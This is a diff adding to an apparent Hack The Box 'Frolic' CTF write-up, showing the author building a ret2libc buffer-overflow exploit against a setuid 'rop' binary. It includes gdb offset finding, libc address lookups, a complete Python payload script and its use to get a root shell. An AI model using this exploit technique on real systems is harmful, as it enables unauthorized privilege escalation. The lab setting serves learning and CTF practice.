@@ -357,6 +357,20 @@ www-data@frolic:/home/ayush/.binary$ cat /proc/sys/kernel/randomize_va_space
 
 ### Binary (rop) Enumeration
 
+Let's do further enumeration about the binary using `gdb` (I am using `gdb-peda`)
+
+First, we can check for its security. And NX (DEP) is only ENABLED. When this option is enabled, it works with the processor to help prevent buffer overflow attacks by blocking code execution from memory that is marked as non-executable. But we can circumvent this by introducing a technique called ROP (Return Oriented Programming). I have written some blog about this previously. It can be found [here](https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6).
+
+![image](/assets/img/post/htb/frolic/20.png)
+
+Next, let's disasemble the `main`. First `puts` call will be probably printing out something. But the `call  0x80484f8 <vuln>` looks interesting since it's call another func called `<vuln>`. Let's disassemble this.
+
+![image](/assets/img/post/htb/frolic/21.png)
+
+Cool. We can clearly see that there is a vulnerable func called `<strcpy@plt>`. What this does is basically takes the user input and place it into stack. If there is no robust buffer control, we can supply more strings than the program can take and crash the progream eventually. 
+
+![image](/assets/img/post/htb/frolic/22.png)
+
 Let's quickly check if we can cause stack-based BOF to the binary. 
 
 ```console
@@ -369,11 +383,150 @@ Segmentation fault
 
 Ok, so we can confirm if we supply too many strings, we can crash the program. 
 
-Let's do further enumeration about the binary using `gdb` (I am using `gdb-peta`)
 
-First, we can check for its security. And NX (DEP) is only ENABLED. When this option is enabled, it works with the processor to help prevent buffer overflow attacks by blocking code execution from memory that is marked as non-executable. But we can circumvent this by introducing a technique called ROP (Return Oriented Programming). I have written some blog about this previously. It can be found [here](https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6).
+### Binary (rop) - Offset
+
+Now, we know that we can crash the program, let's find the offset value.
+
+Still using the `gdb-peda`, we can create unique patterns. 
+
+```python
+gdb-peda$ pattern create 100
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+```
+
+When we run the program by entering those pattern for the input, we can crash the program at `0x41474141` location.
+
+```python
+gdb-peda$ run $(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"')
+Starting program: /root/Documents/htb/box/frolic/rop $(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"')
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x79 ('y')
+EBX: 0xffffd130 --> 0x2 
+ECX: 0x0 
+EDX: 0xffffd12c --> 0xf7debe00 (<__libc_start_main>:    call   0xf7f0c019)
+ESI: 0xf7fad000 --> 0x1dfd6c 
+EDI: 0xf7fad000 --> 0x1dfd6c 
+EBP: 0x31414162 ('bAA1')
+ESP: 0xffffd100 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+EIP: 0x41474141 ('AAGA')
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41474141
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd100 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+0004| 0xffffd104 ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+0008| 0xffffd108 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+0012| 0xffffd10c ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+0016| 0xffffd110 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+0020| 0xffffd114 ("AA4AAJAAfAA5AAKAAgAA6AAL")
+0024| 0xffffd118 ("AJAAfAA5AAKAAgAA6AAL")
+0028| 0xffffd11c ("fAA5AAKAAgAA6AAL")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41474141 in ?? ()
+```
+
+We can get the offset value as `52`.
+
+```python
+gdb-peda$ pattern offset 0x41474141
+1095188801 found at offset: 52
+```
+
+We can quickly confirm this with the following command.
+
+```python
+gdb-peda$ run $(python -c 'print "A" * 52 + "BBBB"')
+Starting program: /root/Documents/htb/box/frolic/rop $(python -c 'print "A" * 52 + "BBBB"')
+
+...snip...
+
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+```
 
 
+### Binary (rop) - Addresses
 
+In order to exploit `ret2libc`, we need additional addresses from the Frolic box:
+* `libc` Base Address = `0xb7e19000`
+
+```console
+www-data@frolic:/home/ayush/.binary$ ldd ./rop
+        linux-gate.so.1 =>  (0xb7fda000)
+        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
+        /lib/ld-linux.so.2 (0xb7fdb000)
+```
+
+* `system` = `0x0003ada0`
+
+```console
+www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
+1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+```
+
+* `exit` = `0x0002e9d0`
+
+```console
+www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
+141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
+```
+
+* `/bin/sh` = `0x0015ba0b`
+
+```console
+www-data@frolic:/home/ayush/.binary$ strings -a -t x /lib/i386-linux-gnu/libc.so | grep '/bin/sh'
+15ba0b /bin/sh
+```
+
+> **NOTE**: -a = Scan entire file; -t x = Print the offset location of the string in hexdecimal
+
+
+### Binary (rop) - Final Exploit
+
+Let's create an exploit script `exp.py`.
+
+```python
+#!/usr/bin/python
+
+import struct
+
+offset = "A" * 52
+
+libc = 0xb7e19000
+system = struct.pack("<I", libc + 0x0003ada0)
+exit = struct.pack("<I", libc + 0x0002e9d0)
+shell = struct.pack("<I", libc + 0x0015ba0b)
+
+payload = offset + system + exit + shell
+
+print payload
+```
+
+On our Kali box,
+
+```console
+root@kali:~/Documents/htb/box/frolic# python exp.py > payload
+root@kali:~/Documents/htb/box/frolic# cat payload | base64 -w 0
+QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQaA95bfQeeS3C0r3two=
+```
+
+<b>root.txt</b>
+
+On the Frolic box,
+
+```console
+www-data@frolic:/home/ayush/.binary$ echo -n "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQaA95bfQeeS3C0r3two=" | base64 -d > /dev/shm/payload
+
+www-data@frolic:/home/ayush/.binary$ ./rop $(cat /dev/shm/payload)
+# id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+# cat /root/root.txt
+85d3***REDACTED***6222
+```
 
 Thanks for reading!
